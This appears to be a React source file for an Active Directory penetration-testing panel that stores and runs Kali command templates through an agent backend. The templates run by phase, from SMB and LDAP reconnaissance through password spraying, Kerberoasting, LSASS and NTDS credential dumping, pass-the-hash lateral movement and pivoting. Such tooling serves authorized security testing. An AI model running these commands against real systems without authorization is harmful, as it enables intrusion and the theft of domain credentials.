import { ChevronDown, ChevronRight, Copy, Play, RefreshCw, Route, Search } from "lucide-react";
import { useEffect, useMemo, useState } from "react";

import { buildAgentPlan, executeAgentCommand, type AgentPlan, type AuditPhase } from "../api/agent";
import type { Asset } from "../api/assets";
import { listWordlists, type WordlistEntry } from "../api/wordlists";
import { loadToolLibrary, toolLibraryUpdatedEvent, type ToolTemplate } from "./ToolNotebook";

type AgentPlanPanelProps = {
  assets: Asset[];
  workingDirectory: string;
  onWorkingDirectoryChange: (path: string) => void;
  onRunStarted: () => void;
};

type OperationCommand = AgentPlan["commands"][number] & {
  name?: string;
  notes?: string;
};

type DiscoveryMode = "cidr" | "single_ip";

const reportNotebookStorageKey = "ad-redteam-entity-notebook";

const auditPhases: { value: AuditPhase; label: string; detail: string }[] = [
  { value: "reconnaissance", label: "1. Reconocimiento", detail: "IPs, dominios, DCs, DNS, SMB, Kerberos y LDAP." },
  { value: "initial_enumeration", label: "2. Enumeracion inicial", detail: "Usuarios, grupos, shares, politicas y dominio." },
  { value: "credential_access", label: "3. Obtencion de credenciales", detail: "Shares sensibles, GPP, AS-REP y spraying controlado." },
  { value: "initial_access", label: "4. Acceso inicial", detail: "Credenciales contra SMB, WinRM, RDP, MSSQL o LDAP." },
  { value: "authenticated_enumeration", label: "5. Enumeracion autenticada", detail: "BloodHound, ACLs, sesiones, SPNs, GPOs y delegaciones." },
  { value: "exploitation", label: "6. Explotacion", detail: "Kerberoasting, ADCS, ACLs, delegaciones y password reuse." },
  { value: "privilege_escalation", label: "7. Escalada de privilegios", detail: "De usuario a admin local o privilegios de dominio." },
  { value: "lateral_movement", label: "8. Movimiento lateral", detail: "SMB, WinRM, RDP, PsExec y WMI." },
  { value: "pivoting_post_exploitation", label: "9. Pivoting y post-explotacion", detail: "Subredes internas, evidencias, shares, backups, GPOs." },
  { value: "persistence", label: "10. Persistencia", detail: "Documentar o simular persistencia solo con permiso." },
];

function operationTemplate(
  phase: AuditPhase,
  name: string,
  tool: string,
  command: string,
  purpose: string,
  expectedOutput: string,
  notes = "",
): OperationCommand {
  return {
    phase,
    name,
    tool,
    command,
    purpose,
    expected_output: expectedOutput,
    notes,
  };
}

const operationTemplates: OperationCommand[] = [
  operationTemplate("reconnaissance", "Mapeo SMB del CIDR", "nxc", "nxc smb 10.10.10.0/24", "Mapear hosts SMB del rango autorizado.", "IP, hostname, dominio y contexto SMB detectado."),
  operationTemplate("reconnaissance", "Probe LDAP del DC", "nxc", "nxc ldap 10.10.10.10", "Comprobar LDAP contra el DC candidato.", "Dominio, hostname y respuesta LDAP."),
  operationTemplate("reconnaissance", "Servicios TCP", "nmap", "nmap -sV -Pn 10.10.10.10", "Identificar servicios TCP y versiones base.", "Puertos, servicios y versiones detectadas."),
  operationTemplate("reconnaissance", "NetExec SMB baseline", "nxc", "nxc smb <ip_or_cidr>", "Identificar hostname, dominio, signing y contexto SMB.", "Datos base SMB del host o rango."),
  operationTemplate("reconnaissance", "Editar /etc/hosts", "nano", "nano /etc/hosts", "Actualizar resolucion local para hosts AD detectados.", "Entradas de hosts preparadas."),
  operationTemplate("reconnaissance", "RustScan + scripts/versiones", "rustscan", "rustscan -a <target_ip> --no-banner -- -sCV", "Acelerar descubrimiento TCP y enriquecer con scripts/versiones.", "Puertos TCP con scripts y versiones."),
  operationTemplate("reconnaissance", "Nmap UDP top ports", "nmap", "nmap -sUV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 <target_ip> -Pn", "Revisar superficie UDP prioritaria.", "Puertos UDP probables y razones de respuesta."),
  operationTemplate("reconnaissance", "Nmap UDP puerto", "nmap", "nmap -sU -p <port> <target_ip>", "Validar manualmente un puerto UDP concreto.", "Estado del puerto UDP revisado."),

  operationTemplate("initial_enumeration", "RPC null session", "rpcclient", "rpcclient -U \"\" <target_ip> -N", "Probar enumeracion RPC anonima.", "Usuarios, grupos, dominio o rechazo de acceso."),
  operationTemplate("initial_enumeration", "RPC guest", "rpcclient", "rpcclient -U \"guest%\" <target_ip>", "Probar enumeracion RPC con Guest.", "Usuarios, grupos o restricciones visibles."),
  operationTemplate("initial_enumeration", "SMB shares null", "nxc", "nxc smb <target_ip> -u '' -p '' --shares", "Enumerar shares accesibles sin credenciales.", "Shares y permisos anonimos."),
  operationTemplate("initial_enumeration", "RID brute null", "nxc", "nxc smb <target_ip> -u '' -p '' --rid-brute", "Enumerar identidades via RID brute anonimo si aplica.", "Usuarios y grupos resueltos por RID."),
  operationTemplate("initial_enumeration", "SMB shares guest", "nxc", "nxc smb <target_ip> -u 'Guest' -p '' --shares", "Enumerar shares con Guest.", "Shares y permisos con cuenta Guest."),
  operationTemplate("initial_enumeration", "RID brute guest", "nxc", "nxc smb <target_ip> -u 'Guest' -p '' --rid-brute", "Enumerar RIDs usando Guest si esta habilitado.", "Usuarios y grupos resueltos."),
  operationTemplate("initial_enumeration", "Password spray user=user", "nxc", "nxc smb <target_ip> -u <users_list> -p <users_list> --no-bruteforce --continue-on-success", "Validar patron usuario=password de forma controlada.", "Credenciales validas si existen.", "Usar listas controladas. Cambia users por ficheros reales si procede."),
  operationTemplate("initial_enumeration", "Descargar share anonimo", "smbclient", "smbclient -N //<target_ip>/<share>/ -c \"recurse; prompt; mget *;\"", "Descargar contenido de un share anonimo autorizado.", "Ficheros descargados para analisis."),
  operationTemplate("initial_enumeration", "LDAP anonimo", "ldapsearch", "ldapsearch -x -H ldap://<ip_dc> -b 'DC=<domain_part>,DC=<domain_part>'", "Consultar LDAP anonimo.", "Objetos LDAP visibles sin credenciales."),
  operationTemplate("initial_enumeration", "Filtrar LDAP por secretos", "grep", "grep -iE \"pwd|desc|password\" -C 3 <file>", "Buscar indicios de secretos en salida LDAP o ficheros.", "Lineas relevantes con contexto."),
  operationTemplate("initial_enumeration", "Iniciar Neo4j", "neo4j", "neo4j start", "Preparar Neo4j para BloodHound.", "Servicio Neo4j iniciado."),
  operationTemplate("initial_enumeration", "Parar timesyncd", "systemctl", "systemctl stop systemd-timesyncd", "Evitar conflictos de sincronizacion antes de alinear hora con DC.", "Timesyncd detenido."),
  operationTemplate("initial_enumeration", "Sincronizar hora con DC", "ntpdate", "ntpdate <ip_dc>", "Alinear hora con el DC para Kerberos.", "Hora sincronizada con DC."),

  operationTemplate("credential_access", "Kerbrute userenum", "kerbrute", "kerbrute userenum --dc <ip_dc> -d <domain> <users_list>", "Validar usuarios contra Kerberos.", "Usuarios validos."),
  operationTemplate("credential_access", "AS-REP roast", "impacket-GetNPUsers", "impacket-GetNPUsers -no-pass -usersfile <users_list> -dc-ip <ip_dc> <domain>/", "Buscar usuarios sin preautenticacion Kerberos.", "Hashes AS-REP si existen."),
  operationTemplate("credential_access", "Crack NT hashes", "john", "john --format=NT --wordlist=<wordlist> <file>", "Intentar cracking offline de hashes NT autorizados.", "Credenciales recuperadas o estado de cracking."),

  operationTemplate("initial_access", "evil-winrm password", "evil-winrm", "evil-winrm -i <target_ip> -u <user> -p <password>", "Abrir sesion WinRM con credenciales validas.", "Shell WinRM o error de acceso."),

  operationTemplate("authenticated_enumeration", "RPC con credenciales", "rpcclient", "rpcclient -U \"<user>%<password>\" <target_ip>", "Enumerar RPC autenticado.", "Usuarios, grupos y dominio visibles."),
  operationTemplate("authenticated_enumeration", "LDAP autenticado", "ldapsearch", "ldapsearch -x -H ldap://<ip_dc> -D '<user>@<domain>' -w '<password>' -b 'DC=<domain_part>,DC=<domain_part>'", "Enumerar LDAP con credenciales.", "Objetos LDAP autenticados."),
  operationTemplate("authenticated_enumeration", "ldapdomaindump", "ldapdomaindump", "ldapdomaindump -u '<domain>\\<user>' -p '<password>' <ip_dc>", "Volcar estructura AD para analisis.", "HTML/JSON de dominio generado."),
  operationTemplate("authenticated_enumeration", "BloodHound collection", "bloodhound-python", "bloodhound-python -u <user> -p <password> -ns <ip_dc> -d <domain> -c all", "Recolectar relaciones AD para BloodHound.", "JSON de BloodHound para importacion."),

  operationTemplate("exploitation", "Kerberoast", "impacket-GetUserSPNs", "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip_dc> -request -outputfile <file>", "Solicitar TGS de SPNs roastables.", "Hashes Kerberoast guardados."),
  operationTemplate("exploitation", "Certipy templates vulnerables", "certipy-ad", "certipy-ad find -u <user> -p <password> -dc-ip <ip_dc> -vulnerable", "Buscar ADCS vulnerable y plantillas abusables.", "Hallazgos ADCS y posibles ESC."),

  operationTemplate("privilege_escalation", "LSASS con password", "lsassy", "lsassy -d <domain> -u <user> -p <password> <target_ip>", "Extraer credenciales de LSASS con permiso y admin local.", "Credenciales o hashes recuperados.", "Necesita credenciales admin local."),
  operationTemplate("privilege_escalation", "LSASS con hash NT", "lsassy", "lsassy -d <domain> -u <user> -H ':<hash_nt>' <target_ip>", "Extraer credenciales de LSASS usando hash NT.", "Credenciales o hashes recuperados.", "Necesita credenciales admin local."),
  operationTemplate("privilege_escalation", "Dumpear NTDS con nxc", "nxc", "nxc smb <ip_dc> -u <user> -H <hash_nt> --ntds", "Dumpear NTDS desde DC con permisos suficientes.", "Hashes de dominio si esta autorizado y permitido."),
  operationTemplate("privilege_escalation", "Secretsdump SAM + SECURITY", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL", "Extraer secretos offline desde hives locales.", "Hashes y secretos locales."),
  operationTemplate("privilege_escalation", "Secretsdump SAM", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL", "Extraer hashes SAM offline.", "Hashes locales."),
  operationTemplate("privilege_escalation", "samdump2", "samdump2", "samdump2 SAM.save SYSTEM.save -o sam.txt", "Volcar hashes desde SAM y SYSTEM.", "Archivo sam.txt con hashes."),

  operationTemplate("lateral_movement", "evil-winrm hash", "evil-winrm", "evil-winrm -i <target_ip> -u <user> -H <hash_nt>", "Moverse por WinRM con hash NT valido.", "Shell WinRM o error de acceso."),
  operationTemplate("lateral_movement", "psexec password", "impacket-psexec", "impacket-psexec <user>@<target_ip>", "Probar ejecucion remota con PsExec y password.", "Sesion remota o error de permisos."),
  operationTemplate("lateral_movement", "psexec hash", "impacket-psexec", "impacket-psexec <user>@<target_ip> -hashes <LM>:<hash_nt>", "Probar ejecucion remota con PsExec y hash.", "Sesion remota o error de permisos."),
  operationTemplate("lateral_movement", "RDP xfreerdp", "xfreerdp", "xfreerdp /v:<target_ip>:<port> /u:<user> /p:<password>", "Probar acceso RDP autorizado.", "Sesion RDP o error de acceso."),

  operationTemplate("pivoting_post_exploitation", "Proxychains puertos AD", "proxychains", "proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 <target_ip>", "Enumerar puertos AD a traves de proxy.", "Puertos alcanzables via pivot."),
  operationTemplate("pivoting_post_exploitation", "Descargar share con usuario", "smbclient", "smbclient //<target_ip>/<share>/ -U <user> -c \"recurse; prompt; mget *;\"", "Descargar share con credenciales autorizadas.", "Ficheros descargados para analisis."),
  operationTemplate("pivoting_post_exploitation", "SMB server Kali", "impacket-smbserver", "impacket-smbserver recurso $(pwd) -smb2support", "Levantar recurso SMB temporal en Kali.", "Servidor SMB disponible para transferencia."),
  operationTemplate("pivoting_post_exploitation", "Backup remoto de registry", "impacket-reg", "impacket-reg '<domain>/<user>:<password>@<ip_dc>' backup -o '\\\\<kali_ip>\\recurso'", "Realizar backup remoto de registry con permisos validos.", "Hives exportadas al recurso SMB."),
  operationTemplate("pivoting_post_exploitation", "Extraer SAM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --sam", "Extraer SAM si el alcance lo permite.", "SAM extraida."),
  operationTemplate("pivoting_post_exploitation", "Extraer SYSTEM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --system", "Extraer SYSTEM si el alcance lo permite.", "SYSTEM extraido."),
  operationTemplate("pivoting_post_exploitation", "Extraer SECURITY", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --security", "Extraer SECURITY si el alcance lo permite.", "SECURITY extraido."),

  operationTemplate("persistence", "Notas de persistencia", "nota", "# Categoria preparada para ir metiendo tecnicas validadas del entorno cuando las tengas en tus notas.", "Documentar persistencia solo con permiso explicito.", "Notas de persistencia documentadas."),
];

export function AgentPlanPanel({
  assets,
  workingDirectory,
  onWorkingDirectoryChange,
  onRunStarted,
}: AgentPlanPanelProps) {
  const [scope, setScope] = useState("10.10.10.0/24");
  const [discoveryMode, setDiscoveryMode] = useState<DiscoveryMode>("cidr");
  const [domain, setDomain] = useState("corp.local");
  const [discoveryCommand, setDiscoveryCommand] = useState("nxc smb 10.10.10.0/24");
  const [openPanels, setOpenPanels] = useState<Set<string>>(new Set(["0", "reconnaissance"]));
  const [targetIp, setTargetIp] = useState("");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [ntHash, setNtHash] = useState("");
  const [share, setShare] = useState("");
  const [wordlist, setWordlist] = useState("");
  const [filePath, setFilePath] = useState("");
  const [port, setPort] = useState("");
  const [usersList, setUsersList] = useState("");
  const [kaliIp, setKaliIp] = useState("");
  const [ipDc, setIpDc] = useState("");
  const [plansByPhase, setPlansByPhase] = useState<Record<string, AgentPlan>>({});
  const [targetCommands, setTargetCommands] = useState<Record<string, string>>({});
  const [wordlists, setWordlists] = useState<WordlistEntry[]>([]);
  const [toolLibrary, setToolLibrary] = useState<ToolTemplate[]>([]);
  const [reportUsers, setReportUsers] = useState<string[]>([]);
  const [runningKey, setRunningKey] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const assetOptions = useMemo(
    () =>
      assets
        .map((asset) => ({
          label: [asset.ip_address, asset.hostname, asset.domain].filter(Boolean).join(" · "),
          value: asset.ip_address,
        }))
        .sort((left, right) => left.value.localeCompare(right.value)),
    [assets],
  );

  const domainOptions = useMemo(
    () =>
      Array.from(
        new Set(
          assets
            .map((asset) => asset.domain?.trim())
            .filter((assetDomain): assetDomain is string => Boolean(assetDomain)),
        ),
      ).sort((left, right) => left.localeCompare(right)),
    [assets],
  );

  const selectedAsset = assets.find((asset) => asset.ip_address === targetIp);
  const discoveryTarget = scope.trim();
  const effectiveTargetIp = targetIp || (discoveryMode === "single_ip" ? discoveryTarget : "");
  const phaseLabels = useMemo(
    () => new Map(auditPhases.map((phase) => [phase.value, phase.label])),
    [],
  );
  const shareOptions = useMemo(() => {
    const shares = selectedAsset?.shares ?? [];
    const normalizedUser = username.trim().toLowerCase();
    return shares
      .filter((assetShare) => {
        if (!normalizedUser) {
          return true;
        }
        const account = assetShare.account?.trim().toLowerCase();
        return !account || account === "anon" || account === normalizedUser;
      })
      .sort((left, right) => left.name.localeCompare(right.name));
  }, [selectedAsset, username]);
  const userWordlists = useMemo(
    () => wordlists.filter((entry) => entry.category === "Usuarios"),
    [wordlists],
  );
  const passwordWordlists = useMemo(
    () => wordlists.filter((entry) => entry.category !== "Usuarios"),
    [wordlists],
  );
  const toolOperationTemplates = useMemo(
    () => toolLibrary.map(toolTemplateToOperationCommand).filter((template) => template.phase !== "all"),
    [toolLibrary],
  );
  const reportUsersPath = `${workingDirectory.replace(/[\\/]+$/, "") || "."}/report-users.txt`;
  const hostsFileCommand = useMemo(() => {
    const lines = assets
      .map((asset) => buildHostsEntry(asset))
      .filter((entry): entry is string => Boolean(entry));
    return lines
      .map((line) => {
        const quotedLine = shellSingleQuote(line);
        return `grep -qxF ${quotedLine} /etc/hosts || echo ${quotedLine} | sudo tee -a /etc/hosts >/dev/null`;
      })
      .join("; ");
  }, [assets]);

  useEffect(() => {
    setDiscoveryCommand(`nxc smb ${discoveryTarget || (discoveryMode === "cidr" ? "10.10.10.0/24" : "10.10.10.10")}`);
  }, [discoveryMode, discoveryTarget]);

  useEffect(() => {
    setReportUsers(extractReportUsers(assets));
  }, [assets]);

  useEffect(() => {
    const refreshToolLibrary = () => setToolLibrary(loadToolLibrary());
    refreshToolLibrary();
    window.addEventListener(toolLibraryUpdatedEvent, refreshToolLibrary);
    window.addEventListener("storage", refreshToolLibrary);
    return () => {
      window.removeEventListener(toolLibraryUpdatedEvent, refreshToolLibrary);
      window.removeEventListener("storage", refreshToolLibrary);
    };
  }, []);

  useEffect(() => {
    listWordlists()
      .then((nextWordlists) => {
        setWordlists(nextWordlists);
        const firstUserList = nextWordlists.find((entry) => entry.category === "Usuarios");
        const firstGeneralList =
          nextWordlists.find((entry) => entry.id === "rockyou") ??
          nextWordlists.find((entry) => entry.category !== "Usuarios");
        if (firstUserList) {
          setUsersList((currentUsersList) => currentUsersList || firstUserList.path);
        }
        if (firstGeneralList) {
          setWordlist((currentWordlist) => currentWordlist || firstGeneralList.path);
        }
      })
      .catch((requestError: Error) => setError(requestError.message));
  }, []);

  useEffect(() => {
    if (!targetIp && assetOptions.length > 0) {
      setTargetIp(assetOptions[0].value);
    }
  }, [assetOptions, targetIp]);

  useEffect(() => {
    const targetAsset = assets.find((asset) => asset.ip_address === targetIp);
    if (targetAsset?.domain) {
      setDomain(targetAsset.domain);
    } else if (domainOptions.length > 0) {
      setDomain((currentDomain) => currentDomain || domainOptions[0]);
    }
  }, [assets, domainOptions, targetIp]);

  useEffect(() => {
    if (shareOptions.length > 0 && (!share || !shareOptions.some((assetShare) => assetShare.name === share))) {
      setShare(shareOptions[0].name);
    }
  }, [share, shareOptions]);

  function togglePanel(panelId: string) {
    setOpenPanels((current) => {
      const next = new Set(current);
      if (next.has(panelId)) {
        next.delete(panelId);
      } else {
        next.add(panelId);
      }
      return next;
    });
  }

  function handleCopy(command: string) {
    navigator.clipboard?.writeText(command);
  }

  async function handleRunDiscovery() {
    setError(null);
    if (!discoveryTarget) {
      setError("Indica un bloque CIDR o una IP para el mapeado inicial");
      return;
    }
    setRunningKey("discovery");
    try {
      await executeAgentCommand(discoveryCommand, discoveryTarget, "network_discovery", workingDirectory);
      onRunStarted();
    } catch (requestError) {
      setError(requestError instanceof Error ? requestError.message : "Error ejecutando mapeado");
    } finally {
      setRunningKey(null);
    }
  }

  async function handleRunHostsUpdate() {
    setError(null);
    if (!hostsFileCommand) {
      setError("No hay hosts con IP, dominio y hostname para preparar /etc/hosts");
      return;
    }
    setRunningKey("hosts-file");
    try {
      await executeAgentCommand(hostsFileCommand, discoveryTarget || effectiveTargetIp || "localhost", "hosts_file", workingDirectory);
      onRunStarted();
    } catch (requestError) {
      setError(requestError instanceof Error ? requestError.message : "Error actualizando /etc/hosts");
    } finally {
      setRunningKey(null);
    }
  }

  async function handleGenerateReportUsers() {
    setError(null);
    const nextReportUsers = extractReportUsers(assets);
    setReportUsers(nextReportUsers);
    if (nextReportUsers.length === 0) {
      setError("No he encontrado usuarios en el informe todavia");
      return;
    }
    const command = buildReportUsersCommand(reportUsersPath, nextReportUsers);
    setRunningKey("report-users");
    try {
      await executeAgentCommand(command, "localhost", "wordlist_generation", workingDirectory);
      setUsersList(reportUsersPath);
      onRunStarted();
    } catch (requestError) {
      setError(requestError instanceof Error ? requestError.message : "Error generando usuarios del informe");
    } finally {
      setRunningKey(null);
    }
  }

  async function handleBuildPhasePlan(phase: AuditPhase) {
    setError(null);
    if (!effectiveTargetIp) {
      setError("Selecciona una IP detectada o usa el modo IP unica en el mapeado inicial");
      return;
    }
    try {
      const nextPlan = await buildAgentPlan(discoveryTarget || effectiveTargetIp, domain, "ip", effectiveTargetIp, phase, {
        username,
        password,
        ntHash,
        share,
        wordlist,
        file: filePath,
        port,
        usersList,
        kaliIp,
        ipDc,
      });
      setPlansByPhase((current) => ({ ...current, [phase]: nextPlan }));
      setTargetCommands((current) => ({
        ...current,
        ...Object.fromEntries(
          nextPlan.commands.map((command, index) => [
            commandKey(phase, command.phase, command.tool, index),
            command.command,
          ]),
        ),
      }));
    } catch (requestError) {
      setError(requestError instanceof Error ? requestError.message : "Error generando plan");
    }
  }

  async function handleBuildAllPlans() {
    for (const phase of auditPhases) {
      await handleBuildPhasePlan(phase.value);
    }
  }

  async function handleRunTargetCommand(key: string, phase: string, fallbackCommand = "") {
    setError(null);
    if (!effectiveTargetIp) {
      setError("Selecciona una IP detectada o usa el modo IP unica en el mapeado inicial");
      return;
    }
    setRunningKey(key);
    try {
      const command = targetCommands[key] ?? fallbackCommand;
      const authorizedScope = command.includes(effectiveTargetIp) ? effectiveTargetIp : ipDc || effectiveTargetIp;
      await executeAgentCommand(command, authorizedScope, phase, workingDirectory);
      onRunStarted();
    } catch (requestError) {
      setError(requestError instanceof Error ? requestError.message : "Error ejecutando comando");
    } finally {
      setRunningKey(null);
    }
  }

  return (
    <section className="panel agent-panel operations-panel">
      <div className="panel-header">
        <div>
          <p className="eyebrow">Agente Kali</p>
          <h2>Panel de operaciones</h2>
        </div>
        <Route size={22} />
      </div>

      <section className="operation-params">
        <div className="panel-header compact-header">
          <div>
            <p className="eyebrow">Variables globales</p>
            <h3>Parametros del engagement</h3>
          </div>
        </div>

        <div className="agent-form context-form">
          <div className="form-control">
            <span>Modo mapeado</span>
            <div className="mode-toggle" role="group" aria-label="Modo de mapeado inicial">
              <button
                className={discoveryMode === "cidr" ? "active" : ""}
                type="button"
                onClick={() => {
                  setDiscoveryMode("cidr");
                  setScope((currentScope) => (currentScope.includes("/") ? currentScope : "10.10.10.0/24"));
                }}
              >
                Bloque CIDR
              </button>
              <button
                className={discoveryMode === "single_ip" ? "active" : ""}
                type="button"
                onClick={() => {
                  setDiscoveryMode("single_ip");
                  setScope((currentScope) => currentScope.replace(/\/\d+$/, "") || "10.10.10.10");
                }}
              >
                IP unica
              </button>
            </div>
          </div>
          <label>
            {discoveryMode === "cidr" ? "Bloque CIDR" : "IP unica"}
            <input
              value={scope}
              onChange={(event) => setScope(event.target.value)}
              placeholder={discoveryMode === "cidr" ? "10.10.10.0/24" : "10.10.10.10"}
            />
          </label>
          <label>
            IP / Hostname
            <select
              value={targetIp}
              disabled={assetOptions.length === 0}
              onChange={(event) => setTargetIp(event.target.value)}
            >
              <option value="">{assetOptions.length === 0 ? "Sin hosts detectados" : "Seleccionar host"}</option>
              {assetOptions.map((asset) => (
                <option key={asset.value} value={asset.value}>
                  {asset.label}
                </option>
              ))}
            </select>
          </label>
          <label>
            Dominio
            {domainOptions.length > 0 ? (
              <select value={domain} onChange={(event) => setDomain(event.target.value)}>
                <option value="">Sin dominio</option>
                {domainOptions.map((assetDomain) => (
                  <option key={assetDomain} value={assetDomain}>
                    {assetDomain}
                  </option>
                ))}
              </select>
            ) : (
              <input value={domain} onChange={(event) => setDomain(event.target.value)} />
            )}
          </label>
          <label>
            Usuario
            <input value={username} onChange={(event) => setUsername(event.target.value)} placeholder="<user>" />
          </label>
          <label>
            Password
            <input value={password} onChange={(event) => setPassword(event.target.value)} placeholder="<password>" />
          </label>
          <label>
            Hash NT
            <input value={ntHash} onChange={(event) => setNtHash(event.target.value)} placeholder="<hash_nt>" />
          </label>
          <label>
            Share
            {shareOptions.length > 0 ? (
              <select value={share} onChange={(event) => setShare(event.target.value)}>
                <option value="">Seleccionar share</option>
                {shareOptions.map((assetShare) => (
                  <option key={`${assetShare.name}-${assetShare.account ?? "anon"}`} value={assetShare.name}>
                    {[assetShare.name, assetShare.permissions, assetShare.account].filter(Boolean).join(" · ")}
                  </option>
                ))}
              </select>
            ) : (
              <input value={share} onChange={(event) => setShare(event.target.value)} placeholder="<share>" />
            )}
          </label>
          <label>
            Users list
            <select
              value={usersList}
              disabled={userWordlists.length === 0 && reportUsers.length === 0}
              onChange={(event) => setUsersList(event.target.value)}
            >
              <option value="">
                {userWordlists.length === 0 && reportUsers.length === 0
                  ? "Sin diccionarios de usuarios"
                  : "Seleccionar usuarios"}
              </option>
              {reportUsers.length > 0 && (
                <option value={reportUsersPath}>Usuarios del informe ({reportUsers.length})</option>
              )}
              {userWordlists.map((entry) => (
                <option key={entry.id} value={entry.path}>
                  {entry.label}
                </option>
              ))}
            </select>
            <button
              className="secondary-action compact-action"
              disabled={runningKey === "report-users"}
              type="button"
              onClick={handleGenerateReportUsers}
            >
              {runningKey === "report-users" ? "Generando..." : "Generar usuarios del informe"}
            </button>
          </label>
          <label>
            Wordlist
            <select
              value={wordlist}
              disabled={passwordWordlists.length === 0}
              onChange={(event) => setWordlist(event.target.value)}
            >
              <option value="">
                {passwordWordlists.length === 0 ? "Sin diccionarios detectados" : "Seleccionar diccionario"}
              </option>
              {passwordWordlists.map((entry) => (
                <option key={entry.id} value={entry.path}>
                  {entry.category} - {entry.label}
                </option>
              ))}
            </select>
          </label>
          <label>
            Fichero
            <input value={filePath} onChange={(event) => setFilePath(event.target.value)} placeholder="<file>" />
          </label>
          <label>
            DC IP
            <input value={ipDc} onChange={(event) => setIpDc(event.target.value)} placeholder="<ip_dc>" />
          </label>
          <label>
            Puerto
            <input value={port} onChange={(event) => setPort(event.target.value)} placeholder="<port>" />
          </label>
          <label>
            Kali IP
            <input value={kaliIp} onChange={(event) => setKaliIp(event.target.value)} placeholder="<kali_ip>" />
          </label>
          <label>
            Carpeta de trabajo
            <input
              value={workingDirectory}
              onChange={(event) => onWorkingDirectoryChange(event.target.value)}
              placeholder="data/downloads"
            />
          </label>
        </div>
      </section>

      <div className="agent-flow">
        <section className="agent-step">
          <button className="step-heading collapsible-heading" type="button" onClick={() => togglePanel("0")}>
            {openPanels.has("0") ? <ChevronDown size={18} /> : <ChevronRight size={18} />}
            <div>
              <strong>
                <Search size={16} /> 0. Mapeado
              </strong>
              <span>Ejecuta NetExec SMB y guarda IP, hostname y dominio.</span>
            </div>
          </button>

          {openPanels.has("0") && (
            <>
              <div className="command-row inline-operation-command">
                <div>
                  <span>Mapeado</span>
                  <strong>nxc</strong>
                </div>
                <textarea
                  className="inline-command"
                  value={discoveryCommand}
                  onChange={(event) => setDiscoveryCommand(event.target.value)}
                />
                <p>
                  {discoveryMode === "cidr"
                    ? "Descubre equipos SMB dentro del bloque configurado."
                    : "Mapea una unica maquina para CTF o laboratorios de host individual."}
                </p>
                <div className="command-actions">
                  <button
                    aria-label="Copiar comando de mapeado"
                    className="icon-button"
                    type="button"
                    onClick={() => handleCopy(discoveryCommand)}
                  >
                    <Copy size={16} />
                  </button>
                  <button
                    className="run-button"
                    disabled={runningKey === "discovery"}
                    type="button"
                    onClick={handleRunDiscovery}
                  >
                    {runningKey === "discovery" ? <RefreshCw size={16} /> : <Play size={16} />}
                    Ejecutar mapeado
                  </button>
                </div>
              </div>
              <div className="command-row inline-operation-command">
                <div>
                  <span>Hosts</span>
                  <strong>/etc/hosts</strong>
                </div>
                <textarea
                  className="inline-command"
                  value={hostsFileCommand || "# Ejecuta primero el mapeado para detectar IP, dominio y hostname."}
                  readOnly
                />
                <p>
                  Agrega lineas como IP dominio hostname.dominio hostname solo si esa entrada exacta no existe.
                </p>
                <div className="command-actions">
                  <button
                    aria-label="Copiar comando de hosts"
                    className="icon-button"
                    disabled={!hostsFileCommand}
                    type="button"
                    onClick={() => handleCopy(hostsFileCommand)}
                  >
                    <Copy size={16} />
                  </button>
                  <button
                    className="run-button"
                    disabled={!hostsFileCommand || runningKey === "hosts-file"}
                    type="button"
                    onClick={handleRunHostsUpdate}
                  >
                    {runningKey === "hosts-file" ? <RefreshCw size={16} /> : <Play size={16} />}
                    Agregar a /etc/hosts
                  </button>
                </div>
              </div>
            </>
          )}
        </section>

        {auditPhases.map((phase) => (
          <section className="agent-step" key={phase.value}>
            <button
              className="step-heading collapsible-heading"
              type="button"
              onClick={() => togglePanel(phase.value)}
            >
              {openPanels.has(phase.value) ? <ChevronDown size={18} /> : <ChevronRight size={18} />}
              <div>
                <strong>
                  <Route size={16} /> {phase.label}
                </strong>
                <span>{phase.detail}</span>
              </div>
            </button>

            {openPanels.has(phase.value) && (
              <>
                <div className="command-list phase-command-list">
                  {toolOperationTemplates
                    .filter((template) => template.phase === phase.value)
                    .map((template, index) => {
                      const key = commandKey("template", phase.value, template.tool, index);
                      return (
                        <CommandCard
                          command={template}
                          commandKey={key}
                          commandValue={targetCommands[key] ?? template.command}
                          isRunning={runningKey === key}
                          phaseLabel={phase.label}
                          onChange={(value) =>
                            setTargetCommands((current) => ({
                              ...current,
                              [key]: value,
                            }))
                          }
                          onCopy={() => handleCopy(targetCommands[key] ?? template.command)}
                          onRun={() => handleRunTargetCommand(key, template.phase, template.command)}
                        />
                      );
                    })}
                </div>
                {toolOperationTemplates.filter((template) => template.phase === phase.value).length === 0 ? (
                  <p className="empty-text">Agrega herramientas a esta fase desde la pestaña Tools.</p>
                ) : null}
              </>
            )}
          </section>
        ))}
      </div>

      {error && <div className="state-panel error">{error}</div>}
    </section>
  );
}

function CommandCard({
  command,
  commandKey,
  commandValue,
  isRunning,
  phaseLabel,
  onChange,
  onCopy,
  onRun,
}: {
  command: OperationCommand;
  commandKey: string;
  commandValue: string;
  isRunning: boolean;
  phaseLabel: string;
  onChange: (value: string) => void;
  onCopy: () => void;
  onRun: () => void;
}) {
  const variables = extractVariables(commandValue);

  return (
    <article className="command-row" key={commandKey}>
      <div>
        <span>{phaseLabel}</span>
        <strong>{command.name ? `${command.name} · ${command.tool}` : command.tool}</strong>
      </div>
      <textarea
        aria-label={`Comando ${command.tool}`}
        value={commandValue}
        onChange={(event) => onChange(event.target.value)}
      />
      <p>{command.purpose}</p>
      <p className="command-expected">{command.expected_output}</p>
      {command.notes ? <p className="command-expected">{command.notes}</p> : null}
      {variables.length > 0 && (
        <div className="variable-chip-list">
          {variables.map((variable) => (
            <span key={variable}>{variable}</span>
          ))}
        </div>
      )}
      <div className="command-actions">
        <button aria-label="Copiar comando" className="icon-button" type="button" onClick={onCopy}>
          <Copy size={16} />
        </button>
        <button className="run-button" disabled={isRunning} type="button" onClick={onRun}>
          {isRunning ? <RefreshCw size={16} /> : <Play size={16} />}
          Ejecutar
        </button>
      </div>
    </article>
  );
}

